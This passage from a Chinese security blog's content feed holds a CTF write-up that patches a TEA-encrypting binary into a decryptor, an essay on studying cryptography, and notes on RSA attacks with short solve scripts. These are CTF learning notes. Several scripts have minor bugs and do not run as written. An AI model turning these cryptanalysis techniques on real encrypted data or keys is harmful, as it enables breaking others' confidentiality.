class="number">0x61C88647</span>;</span><br><span class="line">        v3 += (key[<span class="number">1</span>] + (v6 &gt;&gt; <span class="number">5</span>)) ^ (v5 + v6) ^ (key[<span class="number">0</span>] + <span class="number">16</span> * v6);</span><br><span class="line">        v6 += (key[<span class="number">3</span>] + (v3 &gt;&gt; <span class="number">5</span>)) ^ (v5 + v3) ^ (key[<span class="number">2</span>] + <span class="number">16</span> * v3);</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    m[<span class="number">1</span>] = v6;</span><br><span class="line">    m[<span class="number">0</span>] = v3;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%x %x %x\n"</span>, v5, v3, v6);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果</p><p><img src="https://i.loli.net/2021/03/27/MH4JdlDjBr8whVi.png" alt="image-20210327200350437"></p><p><img src="https://i.loli.net/2021/03/27/u2KURgLymST3itQ.png" alt="image-20210327200434464"></p><p>可以看到，前八字节的密文与他给的加密文件的头八字节是一致的。那么至此我们已经可以选择写这个算法的解密算法了。</p><p>这就是方法一，解密脚本暂时没有，因为C语言快忘光了，不怎么会操作，python写起来又不太对，python复现加密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#enc</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">v5=<span class="number">0</span></span><br><span class="line">key = [<span class="number">0x67616C66</span>, <span class="number">0x6b61667b</span>, <span class="number">0x6c665f65</span>, <span class="number">0x7d216761</span>]</span><br><span class="line">m = [<span class="number">0x474e5089</span>, <span class="number">0x0a1a0a0d</span>]</span><br><span class="line">v3 = m[<span class="number">0</span>]</span><br><span class="line">v6 = m[<span class="number">1</span>]</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">    print(hex(v5),hex(v3),hex(v6))</span><br><span class="line">    v5 += <span class="number">0x9E3779B9</span></span><br><span class="line">    v5 &amp;= <span class="number">0xffffffff</span></span><br><span class="line">    v3 += (key[<span class="number">1</span>] + (v6 &gt;&gt; <span class="number">5</span>) ^ (v5 + v6)) ^ (key[<span class="number">0</span>] + <span class="number">16</span> * v6)</span><br><span class="line">    v3 &amp;= <span class="number">0xffffffff</span></span><br><span class="line">    v6 += (key[<span class="number">3</span>] + (v3 &gt;&gt; <span class="number">5</span>) ^ (v5 + v3)) ^ (key[<span class="number">2</span>] + <span class="number">16</span> * v3)</span><br><span class="line">    v6 &amp;= <span class="number">0xffffffff</span></span><br><span class="line">        </span><br><span class="line">print(hex(v3),hex(v6))</span><br></pre></td></tr></table></figure><p>结果</p><p><img src="https://i.loli.net/2021/03/27/fvMRiWVsya53Kph.png" alt="image-20210327203639223"></p><p>第三行的v6开始出错，估计是sar的问题，也就是那个算术位移操作【带符号的】</p><p>所以就放弃了，我选择patch这个程序，让他从加密程序，变成解密程序。</p><h3 id="method-2nd"><a href="#method-2nd" class="headerlink" title="method 2nd"></a>method 2nd</h3><p>他的加密逻辑很简单，</p><p>先加v5</p><p>然后处理v3【v3与v5和v6有关】</p><p>最后处理v6【v6与v5和已经被处理的v3有关】</p><p>那么解密逻辑也不难，</p><p>先处理v6【最后的v6与最后的v5，v3的值有关，且这两个值已知，所以v6可以还原为上一轮的值】</p><p>然后处理v3【最后的v3与最后v5和上一轮的v6值有关，上一轮的v6值我们已经处理出来了，最后的v5我们也知道，因此v3也可以还原为为上一轮的值】</p><p>然后v5减去那个常数</p><p>所以我们可以选择从底层（汇编）改他的程序流程</p><p>但是比赛的时候我又失败了，改流程得稍微处理下，最后我是在原程序的基础上，patch了程序处理的值</p><h3 id="method-3rd"><a href="#method-3rd" class="headerlink" title="method 3rd"></a>method 3rd</h3><p>把v5的初始值改为v5的最终值，然后把v5的add改为sub，那么程序一开始就是sub一下，意味着v5的值一开始就会被还原为上一轮，这是我们不期望的，我们还没用它呢，所以我们得在v5的最终值的基础上，在加一轮先【也就是改成第33轮的v5】，方便程序去sub</p><p>然后就是把v3 patch成v6，把v6 patch成v3。</p><p>与此同时我们也要把他们用到的key调换一下，但调换的时候会遇到问题，好像是代码的长度对不上，那么我们就直接在.data段【hex-view】把key前后两段的顺序换一下，这样效果还是一样的。</p><p>结果为</p><p><img src="https://i.loli.net/2021/03/27/KwZpkmBEQ3JTfDA.png" alt="image-20210327202523573"></p><p><img src="https://i.loli.net/2021/03/27/ajSwB9l6dsrUQJp.png" alt="image-20210327202536357"></p><p>注：patch：【Edit-Patch Program-Asemble】</p><p>​        patch的时候给v5赋值的时候要用dword ptr，不然会报错</p><p>​    <img src="https://i.loli.net/2021/03/27/4NhyuxDrZWQtEYL.png" alt="image-20210327202109607"></p><p>​    patch完了保存【Edit-Patch Program-Apply patches to input file】</p><p>这样子这个程序就变成了解密程序了，将加密图片的后缀去掉，点击这个程序，然后就会生成一个tea.png.out文件，再把这个文件后缀去掉，就是flag的图片了。</p><p>patch好的程序也一起塞着<a href="https://github.com/JayxV/Van1sh_Utility/blob/main/DASCTF-March/drinkSomeTea" target="_blank" rel="noopener">这里</a>了</p><p>【回头补一下前两个方法的做法】</p>]]></content>
      
      
      <categories>
          
          <category> 逆向小屋 </category>
          
          <category> patch </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>密码学学习笔记 之 密码学随笔</title>
      <link href="/2021/01/01/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8B%E5%AF%86%E7%A0%81%E5%AD%A6%E9%9A%8F%E7%AC%94/"/>
      <url>/2021/01/01/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8B%E5%AF%86%E7%A0%81%E5%AD%A6%E9%9A%8F%E7%AC%94/</url>
      
        <content type="html"><![CDATA[<p>&emsp; &emsp;元旦快乐嗷，2021年水的第一篇博客，就来随便聊聊密码学叭，欢迎感兴趣的朋友一起交流讨论吖~</p><p>&emsp; &emsp;密码学这个学科，和战争是离不开关系的，从以前的罗马战争，到最近一次的大战——第二次世界大战，都有密码学活跃的身影，并且对战局也有着非常重要的影响。但在这个相对和平而互联网发展迅速的年代，密码学则活跃在各种传输、交易等协议中。</p><p>&emsp; &emsp;从历史上看，1945年前，密码学这门学科可以看作一门艺术，而1945年后，信息论之父——香农，发表的一篇《Communication Theory of Secrecy Systems》指出，数据安全是基于密钥的保密性而不是算法的保密性，从此，密码学正式开始被称为一门学科，现代密码学的设计也都基于这个原则。继而是1976年现代密码学之父Whitfield Diffie和Martin Edward  Hellman提出的公钥密码学思想，被誉为密码学发展史上唯一的真正革命。从此现代密码也朝着公钥密码的方向发展。</p><p>&emsp; &emsp;可能刚接触CTF的同学会觉得密码学相对其他方向门槛低。确实，如果接触的古典密码比较多的话，是会有这种感觉，因为古典密码也是出现在算力不足的年代，大多流程、理论也还是比较简单，从而也很容易被攻破。而现代密码的发明都会基于一些数学上的难题，所以学习密码学，有一个比较好的数理基础就比较重要。</p><p>&emsp; &emsp;再谈谈目前的密码学算法。可以简单的分为对称密码和公钥密码（也就是非对称密码），一般来说在一个协议里，对称密码用来加解密传输的信息（因为算起来快），公钥密码用来加密传输对称密码的密钥。其中公钥密码比较常见而著名的就是基于大数分解难题的RSA、基于离散对数问题的DSA、基于椭圆曲线上离散对数问题的ECC。由于都是在有限域上，所以用的都是模运算。对称密码则可进一步拆成流密码和分组密码，其中比较重要的运算法则则是具有对合性的异或运算。流密码的思想就是通过一个初始状态，能生成一堆尽可能真随机的密钥流，用来异或明文信息得到密文信息，解密人只需要掌握这个初始状态就可以了。分组密码则是将明文和密钥输入，通过一些列复杂的的运算网络，然后计算出密文。</p><p>&emsp; &emsp;所以我们要学什么？</p><p>&emsp; &emsp;密码学也可以有两个终极方向，攻和守，你可以运用所学去攻破现在正在运行的算法，也可以运用所学去防御现在甚至是未来会出现的攻击手法。而在此前，你至少得把现存的一些用的比较多的密码算法给了解一遍叭，把现存的攻击手法也都给学会叭。而看懂原理、学会攻击，你至少得有相应的基础知识积累叭。</p><p>&emsp; &emsp;学科上，数学、线性代数、信息安全数学基础这基本科可以算是密码学的基础课。这里说的是数学，包括但不限于高中数学、高等数学，甚至也有可能会出现一些奥赛的东西。然后是线性代数，里面的很多概念都是很有用的（虽然学的时候可能是云里雾里的，所以推荐去看一些课外的书，加深一些理解会吸收的比较好些）。最接近的就是信息安全数学基础，其实也就是抽象代数，模运算、模逆元、原根等等这些概念，还有很多运算性质，数论四大定理等等。把基础打好，对于后面一些具体密码算法的学习才容易理解。至于密码学更多的实体算法，<a href="https://github.com/JayxV/Van1sh_Utility/blob/main/paper%26book/%E3%80%8A%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AF%86%E7%A0%81%E5%AD%A6%E2%80%94%E2%80%94%E5%B8%B8%E7%94%A8%E5%8A%A0%E5%AF%86%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E4%B8%8E%E5%BA%94%E7%94%A8%E3%80%8B.pdf" target="_blank" rel="noopener">《深入浅出密码学》</a>是很不错的一本入门书籍。更进一步的与数学有关的密码学学习可以看看这本<a href="https://github.com/JayxV/Van1sh_Utility/blob/main/paper%26book/introduction-to-mathematical-cryptography.pdf" target="_blank" rel="noopener">《introduction-to-mathematical-cryptography》</a>。</p><p>&emsp; &emsp;总之，基础很重要！基础很重要！基础很重要！</p><p>&emsp; &emsp;而现在有CTF这个“工具”，你可以在学习理论知识的同时付诸于实践，更加深理解，我觉得这才是CTF带给我们真正有用的，有价值的东西。它是一个很好的工具，一个学习、交流平台。诚然在CTF竞赛中拿到flag、取得名次、赢取奖金让人兴奋，但打CTF不可能会是一个终极目标。它只是一个开始…</p>]]></content>
      
      
      <categories>
          
          <category> 密码小屋 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>密码学学习笔记 之 RSA的一些套路</title>
      <link href="/2020/12/18/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8BRSA%E7%9A%84%E4%B8%80%E4%BA%9B%E5%A5%97%E8%B7%AF/"/>
      <url>/2020/12/18/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8BRSA%E7%9A%84%E4%B8%80%E4%BA%9B%E5%A5%97%E8%B7%AF/</url>
      
        <content type="html"><![CDATA[<p><del>咕了快半年233333</del></p><p>这里是RSA最最基础的，也是最最常规的利用，都是由于对算法的不正确使用而造成的，coppersmith相关的attack请移步<a href="https://jayxv.github.io/2020/08/13/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8Bcoppersmith/">密码学学习笔记 之 Coppersmith’s Method</a></p><h1 id="解密算法正确性的证明"><a href="#解密算法正确性的证明" class="headerlink" title="解密算法正确性的证明"></a>解密算法正确性的证明</h1><p>首先从解密算法的正确性证明起手，即证明$m \equiv c^d \pmod n$</p><p>欧拉定理：若$a,n$为正整数，且$𝑎,𝑛$互素（即$gcd(a,n) = 1$），则$𝑎^{𝜑(𝑛)} \equiv 1 \pmod n$。<br>已知 $1 \equiv e\cdot d \pmod {φ(n)}，𝑚 &lt; 𝑛，c \equiv  m^e \pmod n，gcd(𝑚,𝑛) = 1$，求证$m \equiv c^d \pmod n$ </p><p>等式左边为m</p><p>等式右边为$c^d \pmod{n}$<br>∵ $𝑐 \equiv m^e\pmod n $$</p><p>∴ $c^d \pmod n \equiv  (m^e \pmod n)^d \pmod n \equiv  m^{e\cdot d} \pmod n $</p><p>∵ $1 \equiv  e\cdot d \pmod {φ(n)} $</p><p>∴ $e\cdot d \equiv  k\cdot φ(n) + 1 $</p><p>∴ $c^d  \equiv  m^{e \cdot d}  \equiv m^{k\cdot φ(n)+1}  \equiv  m\cdot (m^{φ(n)})^k \pmod n $</p><p>∵ $gcd(m,n) \equiv  1$</p><p> ∴ $m^{φ(n)} \equiv  1 \pmod n $</p><p>∴ $c^d  \equiv  m\cdot (m^{φ(n)})^k \equiv  m\cdot (1)^k \equiv  m \pmod n $</p><p>∵ $m&lt;n$</p><p> ∴ $m \pmod n \equiv  m$</p><p> ∴ $c^d \equiv  m \pmod n \equiv  m $</p><p>等式右边等于等式左边，证毕。</p><hr><h1 id="p和q相差过小"><a href="#p和q相差过小" class="headerlink" title="p和q相差过小"></a>p和q相差过小</h1><p>如果题目代码给到$p = nextprime(q)$这样</p><p>那么说明$p$和$q$特别接近，所以可以看作$n  = p^2$</p><p>所以我们直接对$n$开方就可以得到$p、q$之间的一个值$t$，进而求一个$nextprime(t)$即可得到$p$</p><h1 id="模n有公约数"><a href="#模n有公约数" class="headerlink" title="模n有公约数"></a>模n有公约数</h1><p>利用欧几里得辗转相除法（$gcd$）即可得到$n$的公约数</p><h1 id="已知e-d-n分解模求p-q"><a href="#已知e-d-n分解模求p-q" class="headerlink" title="已知e,d,n分解模求p,q"></a>已知e,d,n分解模求p,q</h1><p>原理来自这篇<a href="https://www.ams.org/notices/199902/boneh.pdf" target="_blank" rel="noopener">综述</a></p><p>给定$d$，计算$k=d\cdot e−1$。根据$d$和$e$的定义我们知道$k$是$φ(N)$的倍数。由于$φ(N)$是偶数，$k=2^tr$其中$r$为奇数且$t≥1$。对于每个$g\in \mathbb{Z_n}$都有$g^k=1$，因此$g^{\frac{k}{2}}$是单位模$N$的平方根。根据中国剩余定理，1在模$N$下有四个平方根。其中两个平方根是$±1$，另外两个是$±x$，其中x满足$x\equiv 1 \pmod p$和$x\equiv −1 \pmod q$。用这最后两个平方根中的任意一个，通过计算$gcd(x−1,N)$来揭示$N$的因式分解。一个直截了当的论证表明，如果从$\mathbb{Z_n}$中随机选择$g$，那么序列中的一个元素$g^{\frac{k}{2}}，g^{\frac{k}{4}},…，g^{\frac{k}{2^t}} \pmod N$是统一平方根的概率至少为$\frac{1}{2}$，从而揭示了$N$的分解，序列中的所有元素可以在时间$\mathcal{O}(n^3))$内有效地计算，其中$n=log_2N$。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> gcd</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> *</span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">factor_n_with_ed</span><span class="params">(n,e,d)</span>:</span>  </span><br><span class="line">    p = <span class="number">1</span>  </span><br><span class="line">    q = <span class="number">1</span>  </span><br><span class="line">    <span class="keyword">while</span> p==<span class="number">1</span> <span class="keyword">and</span> q==<span class="number">1</span>:  </span><br><span class="line">        k = d * e - <span class="number">1</span>  </span><br><span class="line">        g = random.randint ( <span class="number">0</span> , n )  </span><br><span class="line">        <span class="keyword">while</span> p==<span class="number">1</span> <span class="keyword">and</span> q==<span class="number">1</span> <span class="keyword">and</span> k % <span class="number">2</span> == <span class="number">0</span>:  </span><br><span class="line">            k /= <span class="number">2</span>  </span><br><span class="line">            y = pow(g,k,n)  </span><br><span class="line">            <span class="keyword">if</span> y!=<span class="number">1</span> <span class="keyword">and</span> gcd(y<span class="number">-1</span>,n)&gt;<span class="number">1</span>:  </span><br><span class="line">                p = gcd(y<span class="number">-1</span>,n)  </span><br><span class="line">                q = n/p  </span><br><span class="line">    <span class="keyword">return</span> p,q</span><br></pre></td></tr></table></figure><h1 id="d-p、d-q-泄露"><a href="#d-p、d-q-泄露" class="headerlink" title="$d_p、d_q$泄露"></a>$d_p、d_q$泄露</h1><p>摘自这篇<a href="https://code.felinae98.cn/ctf/crypto/rsa%E7%A7%81%E9%92%A5%E9%87%8D%E6%9E%84/" target="_blank" rel="noopener">私钥重构</a></p><p>首先说明$d_p$和$d_q$的含义</p><p>$d_p \equiv d \pmod{φ(p)}$<br>$d_q \equiv d \pmod{φ(q)}$</p><p>利用条件：已知$p，q，d_p，d_q，c$，无公钥$e$、私钥$d$</p><p>证：</p><p>由    $e\cdot d  \equiv 1 \pmod {(p-1)\cdot (q-1)}$</p><p>​        $d_p \equiv d \pmod{φ(p)}$</p><p>得    $e\cdot d_p \equiv  1 \pmod {φ(p)} $</p><p>设$m_1  \equiv  m^{e\cdot d_p}  \equiv  c^{d_p} \pmod p$</p><p>则$m_1 \equiv  m^{k\cdot φ(p)+1} \pmod p $</p><p>由费马小定理，$m^{φ(p)}  \equiv 1 \pmod p$</p><p>所以$ m_1  \equiv  m \pmod p$</p><p>同理 $m_2  \equiv  m  \equiv c^{d_q} \pmod q$</p><p>然后我们就有同余式方程组：$m  \equiv  m_1  \pmod p$</p><p>​                                                   $m  \equiv  m_2  \pmod q$</p><p>然后走一波CRT恢复$m$就好了（$m &lt; p\cdot q$）</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mp = pow(c,dp,p)</span><br><span class="line">mq = pow(c,dq,q)</span><br><span class="line">a = invert(p,q)</span><br><span class="line">b = invert(q,p)</span><br><span class="line">m = (mp*p*a+mq*q*b) % (p*q)</span><br></pre></td></tr></table></figure><h1 id="d-p-泄露"><a href="#d-p-泄露" class="headerlink" title="$d_p$泄露"></a>$d_p$泄露</h1><p>已知：公钥($n,e)$以及$d_p$</p><p>求解：$d$</p><p>已知条件：</p><p>$c\equiv m^e \pmod n$<br>$m\equiv c^d \pmod n$<br>$φ(n)=(p−1)\cdot (q−1)$<br>$d\cdot e\equiv 1 \pmod {φ(n)}$</p><p>$d_p\equiv d \pmod {p−1}$</p><p> 由上式可以得到       $d_p\cdot e\equiv d\cdot e  \pmod {p−1}$</p><p>即                                $d\cdot e = k_1\cdot (p−1)+d_p\cdot e$        ①</p><p>又                                $d\cdot e\equiv 1 \pmod {(p−1)\cdot (q−1)}$            ②</p><p>①带入②得到：        $k_1\cdot (p−1)+d_p\cdot e \equiv  1\pmod { (p−1)\cdot (q−1)}$</p><p>即                          $k_2\cdot (p−1)\cdot (q−1)+1=k_1\cdot (p−1)+d_p\cdot e$</p><p>整理一下    $(p−1)\cdot [k_2\cdot (q−1)−k_1]+1=d_p\cdot e$</p><p>因为                                              $ d_p&lt;p-1$</p><p>所以                                        $e&gt;k_2\cdot (q−1)−k_1$</p><p>我们假设    $x = k_2\cdot (q−1)−k_1$</p><p>即$    x$的范围为$(0,e)$</p><p>那么我们可以遍历$e$种可能就可以求出$p-1 = \frac{d_p\cdot e -1} {x}$，</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rsa_nedp</span><span class="params">(n,e,dp)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,e):</span><br><span class="line">        <span class="keyword">if</span> (dp*e<span class="number">-1</span>)%i == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">if</span> n%(((dp*e<span class="number">-1</span>)/i)+<span class="number">1</span>)==<span class="number">0</span>:</span><br><span class="line">                p=((dp*e<span class="number">-1</span>)/i)+<span class="number">1</span></span><br><span class="line">                q=n/(((dp*e<span class="number">-1</span>)/i)+<span class="number">1</span>)</span><br></pre></td></tr></table></figure><h1 id="低加密指数攻击"><a href="#低加密指数攻击" class="headerlink" title="低加密指数攻击"></a>低加密指数攻击</h1><p>这个很简单，无非就是加密指数$e$的选取太小了，导致$m^e&lt;n$，这个时候根本没有触发模运算，所以直接对$c$开$e$次根就好了。一个明显的特征就是c的bit位数远小于n的bit位数。</p><h1 id="e与φ-n-不互素"><a href="#e与φ-n-不互素" class="headerlink" title="e与φ(n)不互素"></a>e与φ(n)不互素</h1><p>情况分几种叭，</p><h2 id="m-gcd-e-phi-lt-n"><a href="#m-gcd-e-phi-lt-n" class="headerlink" title="$m^{gcd(e,phi)} &lt; n$"></a>$m^{gcd(e,phi)} &lt; n$</h2><p>这也很好理解，有点算是低加密指数攻击的变型</p><p>原来我们的加密公式是$c \equiv m^e \pmod n $</p><p>现设$t = gcd(e,phi)$</p><p>那么加密公式变为$c \equiv m^{ \hat e * t} \pmod n $，其中$\hat e * t = e$</p><p>显然此时$gcd(\hat e ,phi) =1$</p><p>我们可以先利用$\hat e ,phi$算出的私钥$\hat d$进行解密，求出$m^t$</p><p>然后由于$m^t&lt;n$，我们直接对$m^t$开$t$次根就好了。</p><h2 id="e-2"><a href="#e-2" class="headerlink" title="e=2"></a>e=2</h2><p>好家伙，e=2也就意味着上式中的$\hat e$就等于1了，没啥意义了。</p><p>e=2这种特殊情况对应着的是rabin密码系统，具体原理可移步<a href="https://jayxv.github.io/2019/12/03/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8B%E6%95%B0%E8%AE%BA%E5%9B%9B%E5%A4%A7%E5%AE%9A%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8/">密码学学习笔记 之 数论四大定理及应用</a></p><h2 id="e-2-amp-amp-e-phi"><a href="#e-2-amp-amp-e-phi" class="headerlink" title="e != 2 &amp;&amp; e | phi"></a>e != 2 &amp;&amp; e | phi</h2><p>这里要求的条件比较苛刻，你需要知道$n$的分解$p,q$然后再在模$p,q$下对$c$开$e$次根，也即域下开根，现存有一些算法可以做到，比较有效的是AMM，我<a href="https://jayxv.github.io/2019/12/04/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8B%E6%B5%85%E6%9E%90On%20r-th%20Root%20Extraction%20Algorithm%20in%20Fq/">这篇文章</a>给的是另一种算法，稍微麻烦些，要分类讨论。最后如果$m&gt;p， m&gt;q$的话还要CRT一波，解集大小是$gcd(e,p-1)*gcd(e,q-1)$。对应题目可参考<a href="http://www.soreatu.com/posts/intended-solution-to-crypto-problems-in-nctf-2019/#easyrsa909pt-2solvers" target="_blank" rel="noopener">2019NCTF-EASYRSA</a></p><h1 id="公钥n由多个素数因子组成"><a href="#公钥n由多个素数因子组成" class="headerlink" title="公钥n由多个素数因子组成"></a>公钥n由多个素数因子组成</h1><p>因子越多，同等长度$n$的情况下越容易分解。（所以如果$n$长度比较短，因子又被显示地说明有很多，可以试试yafu）</p><p>与正常解密RSA无异。根据定义求$φ(n)$就好。</p><h1 id="低加密指数广播攻击"><a href="#低加密指数广播攻击" class="headerlink" title="低加密指数广播攻击"></a>低加密指数广播攻击</h1><p>满足条件：$m.bit_length*e &lt; \prod c.bit_length    $</p><p>m，e相同，不同的是c和n，有：<br>$c_1 \equiv m^e \pmod {n_1}$<br>$c_2 \equiv m^e \pmod {n_2}$<br>$c_3 \equiv m^e \pmod {n_3}$<br>…<br>$c_n \equiv m^e \pmod {n_n}$ </p><p>CRT可以得到</p><p> $c \equiv m^e \pmod {n_1n_2n_3\cdot\cdot\cdot n_n}$ </p><p>当$c &lt; n_1n_2n_3\cdot\cdot\cdot n_n$时，上面就可以改成等式了</p><p>然后直接开一手根，结束。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n =  []</span><br><span class="line">c =  []</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">CRT</span><span class="params">(mi, ai)</span>:</span></span><br><span class="line">    <span class="keyword">assert</span> (reduce(gmpy2.gcd,mi)==<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">assert</span> (isinstance(mi, list) <span class="keyword">and</span> isinstance(ai, list))</span><br><span class="line">    M = reduce(<span class="keyword">lambda</span> x, y: x * y, mi)</span><br><span class="line">    ai_ti_Mi = [a * (M / m) * gmpy2.invert(M / m, m) <span class="keyword">for</span> (m, a) <span class="keyword">in</span> zip(mi, ai)]</span><br><span class="line">    <span class="keyword">return</span> reduce(<span class="keyword">lambda</span> x, y: x + y, ai_ti_Mi) % M</span><br><span class="line">e=<span class="number">0x7</span></span><br><span class="line">m=iroot(CRT(n, c), e)[<span class="number">0</span>]</span><br><span class="line">print(long_to_bytes(m))</span><br></pre></td></tr></table></figure><h1 id="共模攻击"><a href="#共模攻击" class="headerlink" title="共模攻击"></a>共模攻击</h1><p>已知：若干次加密中使用了相同的模n和不同的公钥e对同一明文m进行了多次加密并且<strong>给出了对应密文</strong>，那么我们就可以在不得到私钥的前提下，解出明文m。</p><p>首先，需要两个加密指数互质：<br>$gcd(e_1,e_2)=1$</p><p>即存在$s_1$和$s_2$使得：<br>$s_1\cdot e_1+s_2\cdot e_2=1$</p><p>又因为：<br>$c_1\equiv m^{e_1} \pmod n$<br>$c_2\equiv m^{e_2} \pmod n$</p><p>两条式子分别求一个$s_1,s_2$次方然后相乘，化简可得：<br>$c_1^{s_1} \cdot  c_2^{s_2} \equiv  m^{e\cdot s_1} \cdot m^{e\cdot s_2} \equiv m^{e\cdot s_1+e\cdot s_2} \equiv m \pmod n$</p><p>即可求出明文</p><p>exp:</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">import</span> sys</span><br><span class="line"><span class="built_in">import</span> binascii</span><br><span class="line">sys.setrecursionlimit(<span class="number">1000000</span>)</span><br><span class="line">def egcd(a, b):</span><br><span class="line">    <span class="keyword">if</span> <span class="attr">a</span> == <span class="number">0</span>:</span><br><span class="line">      return (b, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      g, y, <span class="attr">x</span> = egcd(b % a, a)</span><br><span class="line">      return (g, x - (b // a) * y, y)</span><br><span class="line"></span><br><span class="line">def modinv(a, m):</span><br><span class="line">    g, x, <span class="attr">y</span> = egcd(a, m)</span><br><span class="line">    <span class="keyword">if</span> g != <span class="number">1</span>:</span><br><span class="line">      raise Exception('\pmodular inverse does not exist')</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      return x % m</span><br><span class="line"></span><br><span class="line"><span class="attr">c1=</span></span><br><span class="line"><span class="attr">n=</span></span><br><span class="line"><span class="attr">e1=0xc21000af014a98b2455dec479</span></span><br><span class="line"><span class="attr">c2=</span></span><br><span class="line"><span class="attr">e2=0x9935842d63b75899ddd81b467</span></span><br><span class="line"></span><br><span class="line"><span class="attr">s</span> = egcd(e1, e2)</span><br><span class="line"><span class="attr">s1</span> = s[<span class="number">1</span>]</span><br><span class="line"><span class="attr">s2</span> = s[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> s1&lt;<span class="number">0</span>:</span><br><span class="line">   <span class="attr">s1</span> = - s1</span><br><span class="line">   <span class="attr">c1</span> = modinv(c1, n)</span><br><span class="line">elif s2&lt;<span class="number">0</span>:</span><br><span class="line">   <span class="attr">s2</span> = - s2</span><br><span class="line">   <span class="attr">c2</span> = modinv(c2, n)</span><br><span class="line"><span class="attr">m=(pow(c1,s1,n)*pow(c2,s2,n))</span> % n</span><br><span class="line">print(m)</span><br></pre></td></tr></table></figure><h1 id="低加密指数攻击-1"><a href="#低加密指数攻击-1" class="headerlink" title="低加密指数攻击"></a>低加密指数攻击</h1><h2 id="连分数知识相关"><a href="#连分数知识相关" class="headerlink" 